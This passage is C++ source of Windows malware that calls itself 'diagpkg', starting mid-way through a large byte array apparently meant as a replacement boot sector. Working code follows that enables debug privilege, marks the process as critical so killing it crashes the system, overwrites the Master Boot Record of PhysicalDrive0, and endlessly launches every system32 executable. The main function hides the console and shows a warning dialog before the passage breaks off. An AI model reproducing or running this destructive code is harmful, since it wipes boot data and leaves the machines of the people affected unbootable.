0B,0x19,0x03,0x03,0x06,0x18,0x32,0x19,0x10,0x10,0x20,0x33,0x33,0x33,0x05,0x05,0x0B,0x14,0x14,0x29,0x11,0x11,0x22,0x15,0x15,0x15,0x06,0x06,0x0D,0x3C,0x3C,0x3C,0x00,0x01,0x01,0x0C,0x00,0x00,0x0E,0x0E,0x1D,0x03,0x03,0x08,0x04,0x04,0x0A,0x03,0x03,0x07,0x18,0x18,0x2A,0x09,0x09,0x12,0x14,0x14,0x29,0x05,0x05,0x0D,0x10,0x10,0x21,0x0D,0x0D,0x1A,0x08,0x08,0x13,0x0F,0x0F,0x1F,0x35,0x35,0x35,0x1D,0x1D,0x1D,0x01,0x02,0x02,0x11,0x2A,0x15,0x0C,0x0C,0x1A,0x12,0x12,0x24,0x08,0x08,0x11,0x09,0x1E,0x0E,0x13,0x13,0x26,0x0A,0xFF,0x0B,0x17,0x1A,0x1A,0x2E,0x28,0x28,0x28,0x14,0x14,0x28,0x3F,0x3F,0x26,0x12,0x2B,0x15,0x1B,0x1B,0x2F,0x07,0x07,0x10,0x3F,0x33,0x00,0x12,0x11,0x24,0x23,0x23,0x23,0x15,0x15,0x2A,0x16,0x2F,0x17,0x0B,0x0B,0x18,0x20,0x34,0x21,0x13,0x2D,0x16,0x0A,0x0A,0x15,0x01,0x01,0x01,0x1E,0x34,0x1E,0x19,0x32,0x19,0x11,0x25,0x12,0x0B,0x0B,0x0B,0x11,0x27,0x13,0x19,0x19,0x2C,0x16,0x16,0x27,0x15,0x15,0x25,0x0C,0x20,0x10,0x0D,0x27,0x13,0x0C,0x26,0x13,0x12,0x12,0x25,0x3F,0x33,0x26,0x33,0x0C,0x0C,0x0A,0x24,0x12,0x0A,0x23,0x11,0x06,0x1B,0x0D,0x06,0x20,0x10,0x05,0x1F,0x0F,0x04,0x04,0x09,0x0D,0x0D,0x1B,0x05,0x19,0x0D,0x04,0x1E,0x0F,0x03,0x1D,0x0E,0x3F,0x26,0x00,0xFF,0x17,0x17,0x17,0x03,0x04,0x03,0x08,0x08,0x11,0x0A,0x0A,0x0A,0x0F,0x0F,0x1E,0x03,0x03,0x08,0x1B,0x1B,0x1B,0x04,0x04,0x04,0x2B,0x2B,0x2B,0x34,0x3C,0x34,0x1A,0x33,0x1A,0x1A,0x31,0x1B,0x16,0x30,0x18,0x27,0x27,0x38,0x37,0x37,0x3D,0x1D,0x1D,0x32,0x17,0x17,0x29,0x30,0x30,0x3A,0x2C,0x2C,0x37,0x28,0x28,0x35,0x25,0x25,0x33,0x3F,0x3F,0x33,0x15,0x15,0x15,0x0F,0x10,0x21,0x0E,0x0E,0x1C,0x2B,0x38,0x2B,0x23,0x36,0x23,0x22,0x35,0x22,0x17,0x30,0x18,0x15,0x2F,0x17,0x31,0x31,0x31,0x07,0x0E,0x07,0x14,0x2E,0x17,0x13,0x13,0x13,0x05,0x05,0x05,0x0E,0x24,0x12,0x10,0x29,0x14,0x0F,0x28,0x14,0x09,0x22,0x11,0x08,0x21,0x10,0x2F,0x0F,0x00,0x02,0x14,0x0A,0x02,0x1A,0xF3,0x0D,0x01,0x0A,0x06,0x1E,0x1E,0x1E,0x07,0x0A,0x0E,0x09,0x0F,0x11,0x16,0x16,0x20,0x15,0x16,0x1C,0x15,0x15,0x28,0x16,0x16,0x29,0x15,0x14,0x26,0x02,0x02,0x05,0x00,0x00,0x07,0x16,0x16,0x16,0x09,0x09,0x14,0x07,0x07,0x0F,0x23,0x26,0x23,0x24,0x36,0x24,0x0E,0x1B,0x0F,0x06,0x06,0x06,0x30,0x3A,0x30,0x09,0x19,0x0C,0x10,0x21,0x11,0x04,0x0B,0x05,0x20,0x20,0x33,0x34,0x33,0x3B,0x17,0x16,0x2C,0x11,0x11,0x23,0x20,0x20,0x20,0x2A,0x2A,0x37,0x1B,0x1B,0x30,0x0C,0x0C,0x19,0x1D,0x1D,0x2E,0x0C,0x0C,0x0C,0x26,0x26,0x26,0x37,0x37,0x37,0x1A,0x1A,0x2F,0x1D,0x1D,0x1D,0x08,0x08,0x12,0x00,0x00,0x00,0x00,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x5B,0x5B,0x5B,0x5B,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x01,0x01,0x01,0x01,0x04,0x04,0x00,0x08,0x08,0x00,0x0B,0x0B,0x00,0x83,0x3B,0x3B,0x3B,0x3B,0x04,0x04,0x00,0x06,0x06,0x00,0x1B,0x29,0x00,0x84,0x01,0x5C,0x5C,0x5C,0x5C,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x5D,0x5D,0x5D,0x5D,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x12,0x12,0x12,0x12,0x04,0x04,0x00,0x06,0x06,0x00,0x0E,0x88,0x00,0x0E,0x0E,0x00,0x1C,0x1C,0x00,0x38,0x38,0x00,0x40,0x56,0x56,0x00,0x41,0x40,0x40,0x01,0x40,0x9F,0x40,0x01,0x83,0x03,0x03,0x03,0x03,0x04,0x04,0x00,0x41,0x40,0x40,0x01,0x40,0x99,0x42,0x01,0x40,0xA9,0x40,0x01,0x40,0x97,0x42,0x01,0x40,0xA2,0x40,0x01,0x0B,0x45,0x01,0x41,0x33,0x40,0x06,0x07,0x35,0x01,0x40,0x99,0x41,0x01,0x40,0xA7,0x40,0x01,0x09,0x43,0x01,0x0E,0x9A,0x02,0x41,0x2C,0x40,0x01,0x07,0x42,0x01,0x40,0x4A,0x40,0x01,0x40,0x45,0x81,0x01,0x40,0xAC,0x40,0x01,0x40,0x4F,0x75,0x02,0x40,0xE7,0x40,0x01,0x0C,0xE6,0x00,0x40,0x4D,0x04,0x05,0x40,0x45,0x4B,0x00,0x83,0x8E,0x8E,0x8E,0x8E,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x6E,0x6E,0x6E,0x6E,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x8F,0x8F,0x8F,0x8F,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x6F,0x6F,0x6F,0x6F,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x70,0x70,0x70,0x70,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x38,0x38,0x38,0x38,0x04,0x04,0x00,0x08,0x08,0x00,0x0B,0x0B,0x00,0x83,0x90,0x90,0x90,0x90,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x23,0x23,0x23,0x23,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x91,0x91,0x91,0x91,0x04,0x04,0x00,0x05,0x05,0x00,0x41,0x40,0x40,0x01,0x27,0x40,0x01,0x40,0x4D,0xC1,0x03,0x41,0x1E,0x40,0x01,0x22,0xF1,0x08,0x41,0x24,0x40,0x01,0x1C,0x30,0x00,0x40,0xFC,0x40,0x01,0x22,0x48,0x01,0x22,0xF8,0x0D,0x41,0x21,0x40,0x01,0x12,0xC4,0x03,0x0D,0x11,0x00,0x41,0x06,0x40,0x01,0x18,0x68,0x02,0x08,0x10,0x00,0x1A,0x2A,0x00,0x11,0x40,0x01,0x34,0xAC,0x10,0x40,0xEE,0x40,0x01,0x0D,0xC5,0x0C,0x10,0x4B,0x00,0x35,0xEC,0x11,0x40,0xC4,0x40,0x01,0x15,0x6E,0x07,0x18,0x40,0x01,0x0A,0x44,0x0A,0x0F,0x0F,0x00,0x40,0xFD,0x40,0x01,0x14,0x2A,0x00,0x12,0x20,0x00,0x0E,0x3C,0x00,0x0A,0x1B,0x13,0x10,0x9D,0x0B,0x2B,0x41,0x01,0x83,0x5E,0x5E,0x5E,0x5E,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x3C,0x3C,0x3C,0x3C,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x5F,0x5F,0x5F,0x5F,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x3D,0x3D,0x3D,0x3D,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x0A,0x0A,0x0A,0x0A,0x04,0x04,0x00,0x08,0x08,0x00,0x0C,0x0C,0x00,0x83,0x60,0x60,0x60,0x60,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x61,0x61,0x61,0x61,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x3E,0x3E,0x3E,0x3E,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0xF5,0x0D,0x83,0x21,0x21,0x21,0x21,0x04,0x04,0x00,0x06,0x06,0x00,0x2B,0x40,0x01,0x19,0xF5,0x00,0x14,0x2A,0x00,0x11,0x1A,0x00,0x0F,0x50,0x06,0x11,0x94,0x01,0x40,0xC4,0x40,0x01,0x10,0xE2,0x05,0x1A,0x16,0x01,0x11,0x2B,0x00,0x0F,0x2F,0x06,0x15,0x40,0x01,0x14,0xAB,0x01,0x40,0xDC,0x40,0x01,0x18,0xB6,0x03,0x20,0x40,0x01,0x12,0x49,0x01,0x10,0xEB,0x04,0x40,0xD7,0xC0,0x03,0x2B,0x40,0x01,0x0E,0xF6,0x00,0x11,0x40,0x01,0x0F,0x34,0x01,0x13,0xC0,0x03,0x29,0x5E,0x0A,0x40,0xB6,0x40,0x01,0x1B,0x8D,0x03,0x13,0x40,0x01,0x11,0xF2,0x03,0x13,0x92,0x02,0x10,0x40,0x06,0x09,0x66,0x01,0x40,0xD4,0x40,0x01,0x14,0xEC,0x05,0x0E,0x0E,0x01,0x1A,0xC0,0x07,0x12,0x3F,0x01,0x05,0x5C,0x00,0x0D,0x13,0x00,0x34,0xC1,0x08,0x40,0x9F,0x40,0x01,0x0E,0xB1,0x17,0x13,0xBE,0x17,0x0A,0x32,0x02,0x16,0xF8,0x00,0x1C,0x93,0x03,0x0E,0x79,0x02,0x27,0x76,0x10,0x40,0xB7,0x40,0x01,0x19,0x3E,0x1A,0x05,0x17,0x00,0x1A,0x38,0x02,0x24,0x40,0x01,0x10,0x7D,0x06,0x2C,0x40,0x0B,0x40,0xA1,0x40,0x01,0x16,0xCE,0x13,0x14,0x36,0x0C,0x15,0xC3,0x03,0x26,0x40,0x01,0x1D,0xB4,0x0B,0x40,0xC2,0x40,0x01,0x12,0x5C,0x02,0x10,0x37,0x07,0x10,0xDC,0x0E,0x3C,0x40,0x01,0x2D,0xC0,0x0D,0x40,0xA3,0xC0,0x03,0x15,0x9B,0x03,0x10,0x19,0x05,0x0E,0xBF,0x04,0x40,0x6A,0x40,0x01,0x83,0x92,0x92,0x92,0x92,0x04,0x04,0x00,0x05,0x05,0x00,0x1B,0x16,0x01,0x83,0x71,0x71,0x71,0x71,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x36,0x36,0x36,0x36,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x72,0x72,0x72,0x72,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x39,0x39,0x39,0x39,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x2F,0x2F,0x2F,0x2F,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x24,0x24,0x24,0x24,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x93,0x93,0x93,0x93,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0xC3,0x1B,0x23,0x80,0x25,0x18,0xE4,0x00,0x2C,0x40,0x01,0x26,0x73,0x0F,0x40,0xBD,0x40,0x01,0x18,0x97,0x08,0x1A,0xE5,0x00,0x41,0x12,0x40,0x01,0x2F,0xE5,0x00,0x09,0x0C,0x05,0x15,0xB5,0x12,0x40,0xF0,0x40,0x01,0x40,0x40,0x9E,0x1C,0x41,0x40,0x40,0x01,0x0A,0x40,0x01,0x2B,0x3A,0x00,0x41,0x06,0x40,0x01,0x37,0xF4,0x26,0x2E,0x34,0x00,0x41,0x01,0x40,0x01,0x19,0x32,0x0A,0x41,0x07,0x40,0x01,0x31,0x6F,0x02,0x41,0x07,0x40,0x01,0x2E,0x68,0x01,0x39,0xA3,0x24,0x41,0x01,0x40,0x01,0x13,0xC3,0x12,0x1E,0x30,0x00,0x83,0x73,0x73,0x73,0x73,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0xB8,0x00,0x83,0x74,0x74,0x74,0x74,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x94,0x94,0x94,0x94,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0x32,0x01,0x83,0x75,0x75,0x75,0x75,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x32,0x01,0x84,0x39,0x95,0x95,0x95,0x95,0x04,0x04,0x00,0x05,0x05,0x00,0x1C,0x29,0x28,0x1C,0x1C,0x00,0x38,0x38,0x00,0x0A,0x0A,0x00,0x83,0x76,0x76,0x76,0x76,0x04,0x04,0x00,0x06,0x06,0x00,0x1D,0x7A,0x28,0x0D,0x1C,0x14,0x21,0x7D,0x02,0x41,0x12,0x40,0x01,0x2E,0xAF,0x07,0x41,0x16,0x40,0x01,0x2A,0xF0,0x03,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x83,0x3F,0x3F,0x3F,0x3F,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x62,0x62,0x62,0x62,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x0B,0x0B,0x0B,0x0B,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x13,0x13,0x13,0x13,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x40,0x40,0x40,0x40,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x97,0x0D,0x0F,0x98,0x0D,0x83,0x63,0x63,0x63,0x63,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x64,0x64,0x64,0x64,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x30,0x30,0x30,0x30,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x2B,0x2B,0x2B,0x2B,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x41,0x41,0x41,0x41,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x19,0x19,0x19,0x19,0x04,0x04,0x00,0x08,0x08,0x00,0x0B,0x0B,0x00,0x83,0x65,0x65,0x65,0x65,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x42,0x42,0x42,0x42,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x43,0x43,0x43,0x43,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x31,0x31,0x31,0x31,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x2C,0x2C,0x2C,0x2C,0x04,0x04,0x00,0x05,0x05,0x00,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x43,0xFE,0x00,0x05,0x83,0x77,0x77,0x77,0x77,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x96,0x96,0x96,0x96,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x25,0x25,0x25,0x25,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x4F,0x0E,0x83,0x78,0x78,0x78,0x78,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x79,0x79,0x79,0x79,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x7A,0x7A,0x7A,0x7A,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x97,0x97,0x97,0x97,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x98,0x98,0x98,0x98,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x35,0x35,0x35,0x35,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x0E,0x0E,0x0E,0x0E,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x07,0x07,0x07,0x07,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0xB0,0x00,0x83,0x26,0x26,0x26,0x26,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x99,0x99,0x99,0x99,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x1D,0x1D,0x1D,0x1D,0x04,0x04,0x00,0x06,0x06,0x00,0x0E,0xFE,0x01,0x83,0x1F,0x1F,0x1F,0x1F,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x9A,0x9A,0x9A,0x9A,0x04,0x04,0x00,0x05,0x05,0x00,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x42,0xBE,0xC0,0x03,0x0E,0xA7,0x1A,0x83,0x06,0x06,0x06,0x06,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x08,0x08,0x08,0x08,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x28,0x00,0x83,0x44,0x44,0x44,0x44,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x45,0x45,0x45,0x45,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x46,0x46,0x46,0x46,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x66,0x66,0x66,0x66,0x04,0x04,0x00,0x05,0x05,0x00,0x1A,0x32,0x01,0x0E,0x33,0x01,0x83,0x47,0x47,0x47,0x47,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x10,0x10,0x10,0x10,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x27,0x27,0x27,0x27,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x32,0x01,0x83,0x48,0x48,0x48,0x48,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x49,0x49,0x49,0x49,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x0D,0x0D,0x0D,0x0D,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x02,0x02,0x02,0x02,0x04,0x04,0x00,0x05,0x05,0x00,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x44,0x34,0x00,0x05,0x83,0x28,0x28,0x28,0x28,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x4A,0x4A,0x4A,0x4A,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x4B,0x4B,0x4B,0x4B,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x67,0x67,0x67,0x67,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x2D,0x2D,0x2D,0x2D,0x04,0x04,0x00,0x05,0x05,0x00,0x1B,0xE5,0x0E,0x0D,0x32,0x01,0x84,0x10,0x05,0x05,0x05,0x05,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x0C,0x0C,0x0C,0x0C,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x2E,0x2E,0x2E,0x2E,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x14,0x14,0x14,0x14,0x04,0x04,0x00,0x06,0x06,0x00,0x0E,0xD9,0x00,0x83,0x16,0x16,0x16,0x16,0x04,0x04,0x00,0x06,0x06,0x00,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x44,0x4F,0x00,0x05,0x83,0x7B,0x7B,0x7B,0x7B,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x7C,0x7C,0x7C,0x7C,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x9B,0x9B,0x9B,0x9B,0x04,0x04,0x00,0x05,0x05,0x00,0x0D,0x32,0x01,0x83,0x29,0x29,0x29,0x29,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x1A,0x1A,0x1A,0x1A,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0x25,0x01,0x0D,0x40,0x01,0x83,0x7D,0x7D,0x7D,0x7D,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x32,0x32,0x32,0x32,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0x40,0x01,0x83,0x17,0x17,0x17,0x17,0x04,0x04,0x00,0x06,0x06,0x00,0x40,0x9D,0x00,0x0F,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x42,0x72,0x80,0x02,0x83,0x4C,0x4C,0x4C,0x4C,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x4D,0x4D,0x4D,0x4D,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x4E,0x4E,0x4E,0x4E,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x68,0x68,0x68,0x68,0x04,0x04,0x00,0x05,0x05,0x00,0x0D,0x7A,0x00,0x0D,0x32,0x01,0x0E,0x33,0x01,0x0D,0x32,0x01,0x80,0x05,0x0D,0xA5,0x0D,0x0D,0x32,0x01,0x0E,0x33,0x01,0x0E,0x91,0x6A,0x83,0x4F,0x4F,0x4F,0x4F,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x11,0x11,0x11,0x11,0x04,0x04,0x00,0x06,0x06,0x00,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x44,0x26,0x00,0x05,0x83,0x50,0x50,0x50,0x50,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x28,0x00,0x83,0x51,0x51,0x51,0x51,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x52,0x52,0x52,0x52,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x53,0x53,0x53,0x53,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x69,0x69,0x69,0x69,0x04,0x04,0x00,0x05,0x05,0x00,0x0D,0x32,0x01,0x1B,0x65,0x1B,0x0E,0x40,0x01,0x83,0x6A,0x6A,0x6A,0x6A,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x54,0x54,0x54,0x54,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x6B,0x6B,0x6B,0x6B,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x55,0x55,0x55,0x55,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x56,0x56,0x56,0x56,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x1C,0x1C,0x1C,0x1C,0x04,0x04,0x00,0x06,0x06,0x00,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x44,0x19,0x00,0x05,0x83,0x9C,0x9C,0x9C,0x9C,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0x29,0x00,0x83,0x9D,0x9D,0x9D,0x9D,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x7E,0x7E,0x7E,0x7E,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x7F,0x7F,0x7F,0x7F,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x80,0x80,0x80,0x80,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x9E,0x9E,0x9E,0x9E,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x0F,0x0F,0x0F,0x0F,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x1E,0x1E,0x1E,0x1E,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x9F,0x9F,0x9F,0x9F,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0x40,0x01,0x83,0xA0,0xA0,0xA0,0xA0,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x81,0x81,0x81,0x81,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x04,0x04,0x04,0x04,0x04,0x04,0x00,0x08,0x08,0x00,0x0B,0x0B,0x00,0x83,0x18,0x18,0x18,0x18,0x04,0x04,0x00,0x06,0x06,0x00,0x0E,0xCE,0x1C,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x42,0xD9,0xC0,0x03,0x0D,0x53,0x5D,0x83,0x1B,0x1B,0x1B,0x1B,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0xFC,0x28,0x83,0x82,0x82,0x82,0x82,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x83,0x83,0x83,0x83,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x84,0x84,0x84,0x84,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x6F,0x5D,0x0D,0x40,0x01,0x83,0x15,0x15,0x15,0x15,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x09,0x09,0x09,0x09,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0x40,0x29,0x83,0xA1,0xA1,0xA1,0xA1,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x85,0x85,0x85,0x85,0x04,0x04,0x00,0x06,0x06,0x00,0x1B,0x40,0x01,0x0E,0x0E,0x00,0x40,0x67,0x40,0x29,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x42,0x80,0x80,0x02,0x83,0xA2,0xA2,0xA2,0xA2,0x04,0x04,0x00,0x05,0x05,0x00,0x0E,0x40,0x01,0x0D,0xAE,0x4F,0x83,0x86,0x86,0x86,0x86,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x87,0x87,0x87,0x87,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x88,0x88,0x88,0x88,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0x33,0x33,0x33,0x33,0x04,0x04,0x00,0x05,0x05,0x00,0x1B,0x61,0x5D,0x0D,0xCD,0x0D,0x83,0x89,0x89,0x89,0x89,0x04,0x04,0x00,0x06,0x06,0x00,0x83,0xA3,0xA3,0xA3,0xA3,0x04,0x04,0x00,0x05,0x05,0x00,0x83,0x8A,0x8A,0x8A,0x8A,0x04,0x04,0x00,0x06,0x06,0x00,0x0D,0x24,0x01,0x1C,0x00,0x78,0x40,0x67,0x40,0x42,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x42 };
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);
BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 3584, &dwBytesWritten, 0);
	return 1;
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);
	RegCloseKey(hKey);
	return;
}
DWORD WINAPI FileOpener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(1000);
		}
	}
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	if (MessageBoxA(NULL, "Warℵing! This pr◊gram is a comp⋓ter ⋩irus that known as 'diagpkg'. It maჸ make your compuȶer cannot Ꮗork norma↯ly. Whethe℟ to run or not?\r\n\Plea₰e don't maliᏨiously open thiຣ program on other peoཥle's or public computers! I∲ you accidentally opened 丿t, please click the \"No\" ∄utton to cancel the rนn. If you want to ruՌ it, please make sure you Ǟre running it on your own co♏puter, or ensure that th℮ ᜱvirus on this computeŗ is in a secure environmenቲ (such as a virtua▐ machine, sandbo⌧, etc.) and turn off all aກtivirus software. If you are rʯnning this program on ⭕ther people's or puᛔlic computers, please maЌe sure you are running the ℋarmless edition of thiֆ program, and then c₤ick the \"Yes\" button to continue.", "diagpkg.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
